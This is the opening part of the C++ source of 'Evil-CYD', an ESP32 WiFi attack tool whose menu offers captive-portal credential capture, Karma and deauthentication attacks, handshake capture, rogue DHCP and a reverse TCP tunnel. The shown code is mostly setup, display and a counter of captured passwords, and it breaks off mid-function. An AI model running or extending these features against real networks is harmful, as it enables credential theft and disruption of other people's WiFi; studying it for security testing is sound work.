/*
   Evil-CYD - WiFi Network Testing and Exploration Tool

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/
// remember to change hardcoded webpassword below in the code to ensure no unauthorized access to web interface : !!!!!! CHANGE THIS !!!!!
// Also remember that bluetooth is not protected and anyone can connect to it without pincode ( esp librairies issue) to ensure protection serial password is implemented
#include <SPI.h>
#include <XPT2046_Bitbang.h>  // Use this library for software SPI
#include <TFT_eSPI.h>
#include <WiFi.h>

// Touchscreen pins
#define XPT2046_IRQ 36   // T_IRQ
#define XPT2046_MOSI 32  // T_DIN
#define XPT2046_MISO 39  // T_OUT
#define XPT2046_CLK 25   // T_CLK
#define XPT2046_CS 33    // T_CS


#include <TJpg_Decoder.h>

// Initialize the touch screen using software SPI
XPT2046_Bitbang ts(XPT2046_MOSI, XPT2046_MISO, XPT2046_CLK, XPT2046_CS, XPT2046_IRQ);

// Initialize the TFT display
TFT_eSPI tft = TFT_eSPI();


// Corrected callback function for decoding
bool tftOutput(int16_t x, int16_t y, uint16_t w, uint16_t h, uint16_t *bitmap) {
  if (y >= tft.height()) return false; // Stop if y is beyond screen height
  tft.pushImage(x, y, w, h, bitmap);
  return true; // Continue decoding
}


// Calibration values for touch screen mapping
#define minX 200
#define maxX 3800
#define minY 200
#define maxY 3800

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SD.h>
#include <vector>
#include <string>
#include <set>
#include <TinyGPSPlus.h>
#include <Adafruit_NeoPixel.h> //led
#include <ArduinoJson.h>
#include <esp_now.h>

#include "BLEDevice.h"
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>


#include <esp_task_wdt.h>

#include <HTTPClient.h>
#include <WiFiClientSecure.h>
#include <WiFiClient.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

//deauth
#include "esp_wifi_types.h"
#include "esp_event_loop.h"
//deauth end

//sniff and deauth client
#include "esp_err.h"
#include "nvs_flash.h"
#include <map>
#include <algorithm>
#include <regex>
//sniff and deauth client end

#include <IniFile.h>

String scanIp = "";
#include <lwip/etharp.h>
#include <lwip/ip_addr.h>
#include <ESPping.h>

//ssh
#include "libssh_esp32.h"
#include <libssh/libssh.h>

//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
String ssh_user = "";
String ssh_host = "";
String ssh_password = "";
int ssh_port = 22;
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!

// SSH session and channel
ssh_session my_ssh_session;
ssh_channel my_channel;
//ssh end

String tcp_host = "";
int tcp_port = 4444;

extern "C" {
#include "esp_wifi.h"
#include "esp_system.h"
}

#include <set>
#include <TinyGPS++.h>
#include <Adafruit_NeoPixel.h> //led
#include <ArduinoJson.h>



static constexpr const gpio_num_t SDCARD_CSPIN = GPIO_NUM_5;

bool ledOn = true;// change this to true to get cool led effect (only on fire)
bool randomOn = false;

WebServer server(80);
DNSServer dnsServer;
IPAddress ipAP;    // Adresse IP du mode AP
IPAddress ipSTA;   // Adresse IP du mode STA
bool useAP = true; // Alterner entre AP et STA
const byte DNS_PORT = 53;

int currentIndex = 0, lastIndex = -1;
bool inMenu = true;

const char* menuItems[] = {
  "Scan WiFi",
  "Select Network",
  "Clone & Details",
  "Set Wifi SSID",
  "Set Wifi Password",
  "Set Mac Address",
  "Start Captive Portal",
  "Stop Captive Portal",
  "Change Portal",
  "Check Credentials",
  "Delete All Creds",
  "Monitor Status",
  "Probe Attack",
  "Probe Sniffing",
  "Karma Attack",
  "Karma Auto",
  "Karma Spear",
  "Select Probe",
  "Delete Probe",
  "Delete All Probes",
  "Wardriving",
  "Wardriving Master",
  "Beacon Spam",
  "Deauther",
  "Handshake Master",
  "WiFi Raw Sniffing",
  "Sniff Raw Clients",
  "Wifi Channel Visualizer",
  "Client Sniffing and Deauth",
  "Handshake/Deauth Sniffing",
  "Check Handshakes",
  "Wall Of Flipper",
  "Connect to network",
  "PwnGrid Spam",
  "Skimmer Detector",
  "Reverse TCP Tunnel",
  "DHCP Starvation",
  "Rogue DHCP",
  "Switch DNS",
  "Network Hijacking",
  "Detect Printer",
  "File Print",
  "Check printer status",
  "Settings",
};


const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);

const int maxMenuDisplay = 9;
int menuStartIndex = 0;

String ssidList[100];
int numSsid = 0;
bool isOperationInProgress = false;
int currentListIndex = 0;
String clonedSSID = "Evil-CYD";
int topVisibleIndex = 0;

// Connect to nearby wifi network automaticaly to provide internet to the cardputer you can be connected and provide AP at same time
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
String ssid = ""; // ssid to connect,connection skipped at boot if stay blank ( can be shutdown by different action like probe attack)
String password = ""; // wifi password


//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
// password for web access to remote check captured credentials and send new html file !!!!!! CHANGE THIS !!!!!
const char* accessWebPassword = "7h30th3r0n3"; // !!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!
//!!!!!! CHANGE THIS !!!!!




char ssid_buffer[32] = "";//!!!!!! NOT THIS !!!!!
char password_buffer[64] = ""; //!!!!!! NOT THIS !!!!!

String portalFiles[50]; // 30 portals max
int numPortalFiles = 0;
String selectedPortalFile = "/sites/normal.html"; // defaut portal
int portalFileIndex = 0;


int nbClientsConnected = 0;
int nbClientsWasConnected = 0;
int nbPasswords = 0;
bool isCaptivePortalOn = false;


String macAddresses[10]; // 10 mac address max
int numConnectedMACs = 0;

File fsUploadFile; // global variable for file upload

String captivePortalPassword = "";

// Probe Sniffind part

#define MAX_SSIDS_Karma 200

char ssidsKarma[MAX_SSIDS_Karma][33];
int ssid_count_Karma = 0;
bool isScanningKarma = false;
int currentIndexKarma = -1;
int menuStartIndexKarma = 0;
int menuSizeKarma = 0;
const int maxMenuDisplayKarma = 12;

enum AppState {
  StartScanKarma,
  ScanningKarma,
  StopScanKarma,
  SelectSSIDKarma
};

AppState currentStateKarma = StartScanKarma;

bool isProbeSniffingMode = false;
bool isProbeKarmaAttackMode = false;
bool isKarmaMode = false;

// Probe Sniffing end

// AutoKarma part

volatile bool newSSIDAvailable = false;
char lastSSID[33] = {0};
const int autoKarmaAPDuration = 15000; // Time for Auto Karma Scan can be ajusted if needed consider only add time(Under 10s to fast to let the device check and connect to te rogue AP)
bool isAutoKarmaActive = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
static bool isInitialDisplayDone = false;
char lastDeployedSSID[33] = {0};
bool karmaSuccess = false;
//AutoKarma end

//config file
const char* configFolderPath = "/config";
const char* configFilePath = "/config/config.txt";
int defaultBrightness = 255 * 0.35;                         //  35% default Brightness
String selectedStartupImage = "/img/startup.jpg"; // Valeur par défaut
String selectedStartupSound = "/audio/sample.mp3";          // Valeur par défaut
String selectedTheme = "/theme.ini";                        // Selected Theme Default

std::vector<std::string> whitelist;
std::set<std::string> seenWhitelistedSSIDs;
//config file end

// THEME START
// Assign default theme values, ini in SD root can change them
int taskbarBackgroundColor      = TFT_NAVY;     // Taskbar background color
int taskbarTextColor            = TFT_GREEN;  // Taskbar Textcolor
int taskbarDividerColor         = TFT_PURPLE;     // Taskbar divider color
int menuBackgroundColor         = TFT_BLACK;     // Menu background color
int menuSelectedBackgroundColor = TFT_NAVY;  // Color for bar that highlights selected item
int menuTextFocusedColor        = TFT_GREEN;     // Text color for currently selected item
int menuTextUnFocusedColor      = TFT_WHITE; // Text color for items that are not the currently selected
bool Colorful                   = true;
// THEME END

//led part

#define PIN 4
//#define PIN 25 // for M5Stack Core AWS comment above and uncomment this line
#define NUMPIXELS 1

Adafruit_NeoPixel pixels = Adafruit_NeoPixel(NUMPIXELS, PIN, NEO_GRB);
int delayval = 100;


void setColorRange(int startPixel, int endPixel, uint32_t color) {
  for (int i = startPixel; i <= endPixel; i++) {
    pixels.setPixelColor(i, color);
  }
  pixels.show();
  delay(30);
}

//led part end

bool isItSerialCommand = false;


// deauth and pwnagotchi detector part
const long channelHopInterval = 5000; // hoppping time interval
unsigned long lastChannelHopTime = 0;
int currentChannelDeauth = 1;
bool autoChannelHop = false; // Commence en mode auto
int lastDisplayedChannelDeauth = -1;
bool lastDisplayedMode = !autoChannelHop; // Initialisez à l'opposé pour forcer la première mise à jour
unsigned long lastScreenClearTime = 0; // Pour suivre le dernier effacement de l'écran
char macBuffer[18];
int maxChannelScanning = 13;

int nombreDeHandshakes = 0; // Nombre de handshakes/PMKID capturés
int nombreDeDeauth = 0;
int nombreDeEAPOL = 0;
File pcapFile;
// deauth and pwnagotchi detector end

// Sniff and deauth clients
std::map<std::string, std::vector<std::string>> connections;
std::map<std::string, std::string> ap_names;
std::set<int> ap_channels;
std::map<std::string, int> ap_channels_map;

//If you change these value you need to change it also in the code on deauthClients function
unsigned long lastScanTime = 0;
unsigned long scanInterval = 90000; // interval of deauth and scanning network

unsigned long lastChannelChange = 0;
unsigned long channelChangeInterval = 15000; // interval of channel switching

unsigned long lastClientPurge = 0;
unsigned long clientPurgeInterval = 300000; //interval of clearing the client to exclude no more connected client or ap that not near anymore

unsigned long deauthWaitingTime = 5000; //interval of time to capture EAPOL after sending deauth frame
static unsigned long lastPrintTime = 0;

int nbDeauthSend = 10;

bool isDeauthActive = false;
bool isDeauthFast = false;

// Sniff and deauth clients end

TinyGPSPlus gps;
HardwareSerial cardgps(2); // Create a HardwareSerial object on UART2



bool wificonnected = false;
String ipAddress = "";




#define LCD_BACK_LIGHT_PIN 21
#define LEDC_CHANNEL_0     0
#define LEDC_TIMER_12_BIT  12
#define LEDC_BASE_FREQ     5000

void ledcAnalogWrite(uint8_t channel, uint32_t value, uint32_t valueMax = 255) {
  uint32_t duty = (4095 / valueMax) * min(value, valueMax);
  ledcWrite(channel, duty);
}

void setup() {
  Serial.begin(115200);
#if ESP_IDF_VERSION_MAJOR == 5
  ledcAttach(LCD_BACK_LIGHT_PIN, LEDC_BASE_FREQ, LEDC_TIMER_12_BIT);
#else
  ledcSetup(LEDC_CHANNEL_0, LEDC_BASE_FREQ, LEDC_TIMER_12_BIT);
  ledcAttachPin(LCD_BACK_LIGHT_PIN, LEDC_CHANNEL_0);
#endif
  // Initialize the touch screen (no need to specify SPI)
  ts.begin();


  // Initialize the TFT display
  tft.init();
  tft.setRotation(1);
  tft.fillScreen(TFT_BLACK);

  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE);
  tft.setTextFont(1);

  // Initialiser TJpg_Decoder avec la fonction de callback
  TJpgDec.setJpgScale(1); // Pas de mise à l'échelle
  TJpgDec.setCallback(tftOutput);
  TJpgDec.setSwapBytes(true);

  const char* startUpMessages[] = {
    "  There is no spoon...",
    "    Hack the Planet!",
    " Accessing Mainframe...",
    "    Cracking Codes...",
    "Decrypting Messages...",
    "Infiltrating the Network.",
    " Bypassing Firewalls...",
    "Exploring the Deep Web...",
    "Launching Cyber Attack...",
    " Running Stealth Mode...",
    "   Gathering Intel...",
    "     Shara Conord?",
    " Breaking Encryption...",
    "Anonymous Mode Activated.",
    " Cyber Breach Detected.",
    "Initiating Protocol 47...",
    " The Gibson is in Sight.",
    "  Running the Matrix...",
    "Neural Networks Syncing..",
    "Quantum Algorithm started",
    "Digital Footprint Erased.",
    "   Uploading Virus...",
    "Downloading Internet...",
    "  Root Access Granted.",
    "Cyberpunk Mode: Engaged.",
    "  Zero Days Exploited.",
    "Retro Hacking Activated.",
    " Firewall: Deactivated.",
    "Riding the Light Cycle...",
    "  Engaging Warp Drive...",
    "  Hacking the Holodeck..",
    "  Tracing the Nexus-6...",
    "Charging at 2,21 GigaWatt",
    "  Loading Batcomputer...",
    "  Accessing StarkNet...",
    "  Dialing on Stargate...",
    "   Activating Skynet...",
    " Unleashing the Kraken..",
    " Accessing Mainframe...",
    "   Booting HAL 9000...",
    " Death Star loading ...",
    " Initiating Tesseract...",
    "  Decrypting Voynich...",
    "   Hacking the Gibson...",
    "   Orbiting Planet X...",
    "  Accessing SHIELD DB...",
    " Crossing Event Horizon.",
    " Dive in the RabbitHole.",
    "   Rigging the Tardis...",
    " Sneaking into Mordor...",
    "Manipulating the Force...",
    "Decrypting the Enigma...",
    "Jacking into Cybertron..",
    "  Casting a Shadowrun...",
    "  Navigating the Grid...",
    " Surfing the Dark Web...",
    "  Engaging Hyperdrive...",
    " Overclocking the AI...",
    "   Bending Reality...",
    " Scanning the Horizon...",
    " Decrypting the Code...",
    "Solving the Labyrinth...",
    "  Escaping the Matrix...",
    " You know I-Am-Jakoby ?",
    "You know TalkingSasquach?",
    "Redirecting your bandwidth for Leska free WiFi...", // Donation on Ko-fi // Thx Leska !
    "Where we're going We don't need roads Nefast - 1985",// Donation on Ko-fi // Thx Nefast !
    "Never leave a trace always  behind you by CyberOzint",// Donation on Ko-fi // Thx CyberOzint !
    "Injecting hook.worm ransomware to your android",// Donation on Ko-fi // Thx hook.worm !
    "    You know Kiyomi ? ", // for collab on Wof
    "Redirecting your bandwidth for Leska WiFi...", // Donation on Ko-fi // Thx Leska !
    "Compressing wook.worm algorithm", // Donation on Ko-fi // Thx wook.worm !
    "Summoning the void by kdv88", // Donation on Ko-fi // Thx kdv88 !
    "Egg sandwich - robt2d2",// Donation on Ko-fi // Thx robt2d2 !
    " Scared of the .bat? KNAX", // Donation on Ko-fi // Thx KNAX !
    "    You know Kiyomi ?   ", // for collab on Wof
    "           42           ",
    "    Don't be a Skidz !",
    "  Hack,Eat,Sleep,Repeat",
    "   You know Samxplogs ?",
    " For educational purpose",
    "Time to learn something",
    "U Like Karma? Check Mana",
    "   42 because Universe ",
    "Navigating the Cosmos...",
    "Unlocking Stellar Secrets",
    "Galactic Journeys Await..",
    "Exploring Unknown Worlds.",
    "   Charting Star Paths...",
    "   Accessing zone 51... ",
    "Downloading NASA server..",
    "   You know Pwnagotchi ?",
    "   You know FlipperZero?",
    "You know Hash-Monster ?",
    "Synergizing Neuromancer..",
    "Warping Through Cyberspac",
    "Manipulating Quantum Data",
    "Incepting Dreamscapes...",
    "Unlocking Time Capsules..",
    "Rewiring Neural Pathways.",
    "Unveiling Hidden Portals.",
    "Disrupting the Mainframe.",
    "Melding Minds w Machines.",
    "Bending the Digital Rules",
    "   Hack The Planet !!!",
    "Tapping into the Ether...",
    "Writing the Matrix Code..",
    "Sailing the Cyber Seas...",
    "  Reviving Lost Codes...",
    "   HACK THE PLANET !!!",
    " Dissecting DNA of Data",
    "Decrypting the Multiverse",
    "Inverting Reality Matrice",
    "Conjuring Cyber Spells...",
    "Hijacking Time Streams...",
    "Unleashing Digital Demons",
    "Exploring Virtual Vortexe",
    "Summoning Silicon Spirits",
    "Disarming Digital Dragons",
    "Casting Code Conjurations",
    "Unlocking the Ether-Net..",
    " Show me what you got !!!",
    " Do you have good Karma ?",
    "Waves under surveillance!",
    "    Shaking champagne…",
    "Warping with Rick & Morty",
    "       Pickle Rick !!!",
    "Navigating the Multiverse",
    "   Szechuan Sauce Quest.",
    "   Morty's Mind Blowers.",
    "   Ricksy Business Afoot.",
    "   Portal Gun Escapades.",
    "     Meeseeks Mayhem.",
    "   Schwifty Shenanigans.",
    "  Dimension C-137 Chaos.",
    "Cartman's Schemes Unfold.",
    "Stan and Kyle's Adventure",
    "   Mysterion Rises Again.",
    "   Towelie's High Times.",
    "Butters Awkward Escapades",
    "Navigating the Multiverse",
    "Affirmative Dave, I read you.",
    "Your Evil-M5Core2 have died of dysentery",
    "Did you disable PSRAM ?",
    "You already star project?",
    "Rick's Portal Gun Activated...",
    "Engaging in Plumbus Assembly...",
    "Wubba Lubba Dub Dub!",
    "Syncing with Meeseeks Box.",
    "Searching for Szechuan Sauce...",
    "Scanning Galactic Federation...",
    "Exploring Dimension C-137.",
    "Navigating the Citadel...",
    "Jerry's Dumb Ideas Detected...",
    "Engaging in Ricksy Business...",
    "Morty's Mind Blowers Loading...",
    "Tuning into Interdimensional Cable...",
    "Hacking into Council of Ricks...",
    "Deploying Mr. Poopybutthole...",
    "Vindicators Assemble...",
    "Snuffles the Smart Dog Activated...",
    "Using Butter Robot...",
    "Evil Morty Schemes Unfolding...",
    "Beth's Cloning Facility Accessed...",
    "Listening to Get Schwifty.",
    "Birdperson in Flight...",
    "Gazorpazorpfield Hates Mondays...",
    "Tampering with Time Crystals...",
    "Engaging Space Cruiser...",
    "Gazorpazorp Emissary Arrived...",
    "Navigating the Cronenberg World...",
    "Using Galactic Federation Currency...",
    "Galactic Adventure Awaits.",
    "Plumbus Maintenance In Progress...",
    "Taming the Dream Inceptors",
    "Mr. Goldenfold's Nightmare",
    "Hacking into Unity's Mind.",
    "Alpha 7 Assimilation in Progress...",
    "Purging the Planet...",
    "Planet Music Audition...",
    "Hacking into Rick's Safe..",
    "Extracting from Parasite Invasion...",
    "Scanning for Evil Rick...",
    "Preparing for Jerryboree..",
    "Plutonian Negotiations...",
    "Tiny Rick Mode Activated..",
    "Scanning for Cromulons...",
    "Decoding Rick's Blueprints",
    "Breaking the Fourth Wall..",
    "Jerry's App Idea Rejected.",
    "Galactic Federation Hacked",
    "Portal Gun Battery Low...",
    "ccessing Anatomy Park...",
    "Interdimensional Travel Commencing...",
    "Vampire Teacher Alert...",
    "Navigating Froopyland...",
    "Synchronizing with Butter Bot...",
    "Unity Connection Established...",
    "Evil Morty Conspiracy...",
    "Listening to Roy: A Life Well Lived...",
    "Galactic Government Overthrown...",
    "Scanning for Gearhead...",
    "Engaging Heist-o-Tron...",
    "Confronting Scary Terry...",
    "Engaging in Squanching...",
    "Learning from Birdperson..",
    "Dimension Hopping Initiated...",
    "Morty Adventure Card Filled...",
    "Engaging Operation Phoenix...",
    "Developing DarkMatter Formula",
    "Teleporting to Bird World...",
    "Exploring Blips and Chitz...",
    "Synchronizing with Noob Noob.",
    "Plumbus Optimization...",
    "Beth's Self-Discovery Quest..",
    "Extract from Galactic Prison...",
    "Taming the Zigerion Scammers...",
    "Dimension C-500k Travel...",
    "Sneaking into Birdperson's Wedding...",
    "Preparing Microverse Battery...",
    "Vindicator Call Initiated.",
    "Evil Morty Tracking...",
    "Snuffles' Revolution...",
    "Navigating Abadango Cluster...",
    "Syncing with Phoenix Person...",
    "Stealing from Devil's Antique Shop...",
    "Beth's Horse Surgeon Adventures...",
    "Engaging Purge Planet...",
    "Evil Morty Plans Detected.",
    "Exploring the Thunderdome.",
    "Extracting Toxic Rick...",
    "Tiny Rick Singing...",
    "Birdperson's Memories...",
    "Intergalactic Criminal Record...",
    "Dismantling Unity's Hive Mind...",
    "Engaging with Snuffles...",
    "Exploring Anatomy Park...",
    "Rewiring Rick's Mind...",
    "Scanning for Sleepy Gary..",
    "Navigating the Narnian Box",
    "Engaging Rick's AI Assistant...",
    "Synchronizing with Beth's Clone...",
    "Preparing for Ricklantis Mixup...",
    "Morty's Science Project...",
    "Portal Gun Malfunction...",
    "Galactic Federation Detected...",
    "Jerry's Misadventures...",
    "Engaging Operation Phoenix",
    "Scanning for Snowball...",
    "Morty's Science Project...",
    "Evil Morty's Reign...",
    "Navigating Purge Planet...",
    "Rick's Memories Unlocked..",
    "Synchronizing with Tinkles",
    "Galactic Federation Hacked",
    "Rick's AI Assistant Activated...",
    "Exploring Zigerion Base...",
    "Beth's Identity Crisis...",
    "Galactic Federation Overthrown...",
    "Scanning for Phoenix Person...",
    "Rick's Safe Hacked...",
    "Morty's Adventure Awaits..",
    "Synchronizing with Snowball...",
    "Evil Morty Conspiracy...",
    "Galactic Adventure Awaits.",
    "Rick's AI Assistant Activated...",
    "Interdimensional Cable Tuning...",
    "Navigating Zigerion Base...",
    "Morty's School Science Project...",
    "Rick's Portal Gun Malfunction...",
    "Engaging Ricklantis Mixup..",
    "Galactic Federation Hacked.",
    "Beth's Clone Identified...",
    "Synchronizing with Phoenix Person...",
    "Galactic Government Overthrown...",
    "Listening to Get Schwifty..",
    "Rick's Safe Hacked...",
    "Morty's Mind Blowers Loaded",
    "Engaging Galactic Federation..",
    "Scanning for Snowball...",
    "Evil Morty's Reign Initiated...",
    "Navigating Purge Planet...",
    "Synchronizing with Tinkles...",
    "Galactic Federation Hacked...",
    "Rick's Memories Unlocked...",
    "Exploring Zigerion Base...",
    "Beth's Identity Crisis...",
    "Galactic Federation Overthrown...",
    "Scanning for Phoenix Person...",
    "  Your Evil-CYD have\n     died of dysentery",
  };
  const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);

  randomSeed(esp_random());

  int randomIndex = random(numMessages);
  const char* randomMessage = startUpMessages[randomIndex];

  if (!SD.begin(SDCARD_CSPIN)) {
    Serial.println("Error..");
    Serial.println("SD card not mounted...");
  } else {
    Serial.println("----------------------");
    Serial.println("SD card initialized !! ");
    Serial.println("----------------------");
  }

  // Récupérer les paramètres configurés
  restoreConfigParameter("brightness");
  restoreConfigParameter("ledOn");
  restoreConfigParameter("randomOn");
  restoreConfigParameter("selectedTheme");
  restoreConfigParameter("wifi_ssid");
  restoreConfigParameter("wifi_password");
  restoreConfigParameter("ssh_user");
  restoreConfigParameter("ssh_host");
  restoreConfigParameter("ssh_password");
  restoreConfigParameter("ssh_port");
  restoreConfigParameter("tcp_host");
  restoreConfigParameter("tcp_port");

  restoreThemeParameters();

  loadStartupImageConfig();
  // Si randomOn est activé, charger une image et un son aléatoires
  if (randomOn) {
    String randomImage = getRandomImage();  // Sélectionner une image aléatoire

    drawJpg(randomImage.c_str(), 0, 0);
    if (ledOn) {
      pixels.setPixelColor(0, pixels.Color(255, 0, 0));  // LED rouge allumée
      pixels.show();
    }
    delay(2000);
  } else {
    // Comportement par défaut
    drawJpg(selectedStartupImage.c_str(), 0, 0);
    if (ledOn) {
      pixels.setPixelColor(0, pixels.Color(255, 0, 0));  // LED rouge allumée
      pixels.show();
    }
    delay(2000);
  }

  int textY = 80;
  int lineOffset = 10;
  int lineY1 = textY - lineOffset;
  int lineY2 = textY + lineOffset + 30;

  tft.fillScreen(TFT_BLACK);
  tft.drawLine(0, lineY1, tft.width(), lineY1, TFT_WHITE);
  tft.drawLine(0, lineY2, tft.width(), lineY2, TFT_WHITE);

  tft.setCursor(80, textY);
  tft.println("   Evil-CYD");
  Serial.println("-------------------");
  Serial.println(" Evil-CYD");
  tft.setCursor(75, textY + 20);
  tft.println("By 7h30th3r0n3");
  tft.setCursor(102, textY + 45);
  tft.println("Beta 2024");
  Serial.println("By 7h30th3r0n3");
  Serial.println("-------------------");
  tft.setCursor(0 , textY + 120);
  tft.println(randomMessage);
  Serial.println(" ");
  Serial.println(randomMessage);
  Serial.println("-------------------");
  firstScanWifiNetworks();
  if (ledOn) {
    pixels.setPixelColor(4, pixels.Color(0, 0, 0));
    pixels.setPixelColor(5, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(3, pixels.Color(0, 0, 0));
    pixels.setPixelColor(6, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(2, pixels.Color(0, 0, 0));
    pixels.setPixelColor(7, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(1, pixels.Color(0, 0, 0));
    pixels.setPixelColor(8, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);

    pixels.setPixelColor(0, pixels.Color(0, 0, 0));
    pixels.setPixelColor(9, pixels.Color(0, 0, 0));
    pixels.show();
    delay(50);
  }

  if (ssid != "") {
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.begin(ssid, password);

    unsigned long startAttemptTime = millis();

    while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 3000) {
      delay(500);
      Serial.println("Trying to connect to Wifi...");
    }

    if (WiFi.status() == WL_CONNECTED) {
      Serial.println("Connected to wifi !!!");
    } else {
      Serial.println("Fail to connect to Wifi or timeout...");
    }
  } else {
    Serial.println("SSID is empty.");
    Serial.println("Skipping Wi-Fi connection.");
    Serial.println("----------------------");
  }
  cardgps.begin(9600, SERIAL_8N1, 22, 27); // Assurez-vous que les pins RX/TX sont correctement configurées pour votre matériel

}

void drawJpg(const char* filename, int16_t x, int16_t y) {
  if (SD.exists(filename)) {
    Serial.println("Le fichier JPG a été trouvé sur la carte SD.");
  } else {
    Serial.println("Erreur : Le fichier JPG est introuvable sur la carte SD.");
    return;
  }

  int result = TJpgDec.drawSdJpg(x, y, filename);
  if (result != 1) {
    Serial.print("Erreur lors de l'affichage de l'image JPG, code d'erreur : ");
    Serial.println(result);
  } else {
    Serial.println("Image affichée avec succès.");
  }
}



void firstScanWifiNetworks() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  unsigned long startTime = millis();
  int n;
  while (millis() - startTime < 2000) {
    n = WiFi.scanNetworks();
    if (n != WIFI_SCAN_RUNNING) break;
  }

  if (n == 0) {
    Serial.println("No network found ...");
  } else {
    Serial.print(n);
    Serial.println(" Near Wifi Networks : ");
    Serial.println("-------------------");
    numSsid = min(n, 100);
    for (int i = 0; i < numSsid; i++) {
      ssidList[i] = WiFi.SSID(i);
      Serial.print(i);
      Serial.print(": ");
      Serial.println(ssidList[i]);
    }
    Serial.println("-------------------");
  }
}

unsigned long previousMillis = 0;
const long interval = 1000;


unsigned long lastTaskBarUpdateTime = 0;
const long taskBarUpdateInterval = 1000; // Mettre à jour chaque seconde
bool pageAccessFlag = false;


int getConnectedPeopleCount() {
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;
  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);
  return stationList.num; // Retourne le nombre de clients connectés
}

int getCapturedPasswordsCount() {
  File file = SD.open("/credentials.txt");
  if (!file) {
    return 0;
  }

  int passwordCount = 0;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("-- Password")) {
      passwordCount++;
    }
  }

  file.close();
  return passwordCount;
}

void drawTaskBarBackground() {
  tft.fillRect(0, 0, tft.width(), 18, taskbarBackgroundColor); // Dessiner le fond de la barre des tâches
  tft.fillRect(0, 18, tft.width(), 2, taskbarDividerColor);     // Dessiner le séparateur de la barre des tâches
}


void drawTaskBar() {
  tft.setTextColor(taskbarTextColor, taskbarBackgroundColor); // Définir la couleur du texte et de fond

  if (Colorful) {
    // Nombre de connexions
    int connectedPeople = getConnectedPeopleCount();
    tft.setCursor(0, 2);
    tft.setTextColor(taskbarTextColor, taskbarBackgroundColor);
    tft.print("Sta:");
    tft.setTextColor(connectedPeople > 0 ? menuTextFocusedColor : taskbarTextColor, taskbarBackgroundColor);
    tft.print(String(connectedPeople) + " ");

    // Mots de passe capturés
    int capturedPasswords = getCapturedPasswordsCount();
    tft.setCursor(70, 2);
    tft.setTextColor(taskbarTextColor, taskbarBackgroundColor);
    tft.print("Pwd:");
    tft.setTextColor(capturedPasswords > 0 ? menuTextFocusedColor : taskbarTextColor, taskbarBackgroundColor);
    tft.print(String(capturedPasswords) + " ");

    // Indicateur du portail captif
    tft.setCursor(150, 1);
    tft.setTextColor(taskbarTextColor, taskbarBackgroundColor);
    tft.print("P:");
    tft.setTextColor(isCaptivePortalOn ? TFT_GREEN : TFT_RED, taskbarBackgroundColor);
    tft.print(String(isCaptivePortalOn ? "On" : "Off") + " ");

    // Indicateur de connexion réseau
    tft.setCursor(220, 1);
    tft.setTextColor(taskbarTextColor, taskbarBackgroundColor);
    tft.print("C:");
    tft.setTextColor(WiFi.localIP().toString() != "0.0.0.0" ? TFT_GREEN : TFT_RED, taskbarBackgroundColor);
    tft.print(String(WiFi.localIP().toString() != "0.0.0.0" ? "On" : "Off") + " ");

    // Réinitialiser la couleur du texte
    tft.setTextColor(taskbarTextColor, taskbarBackgroundColor);
  } else {
    // Afficher le nombre de personnes connectées
    int connectedPeople = getConnectedPeopleCount();
    tft.setCursor(0, 2);
    tft.setTextColor(taskbarTextColor, taskbarBackgroundColor);
    tft.print("Sta:" + String(connectedPeople) + " ");

    // Afficher le nombre de mots de passe capturés
    int capturedPasswords = getCapturedPasswordsCount();
    tft.setCursor(70, 2);
    tft.print("Pwd:" + String(capturedPasswords) + " ");

    // Indicateur du portail captif
    tft.setCursor(150, 2);
    tft.setTextColor(isCaptivePortalOn ? TFT_GREEN : TFT_RED, taskbarBackgroundColor);
    tft.print("P:" + String(isCaptivePortalOn ? "On" : "Off") + " ");

    // Indicateur de connexion réseau
    tft.setCursor(220, 2);
    tft.setTextColor(taskbarTextColor, taskbarBackgroundColor);
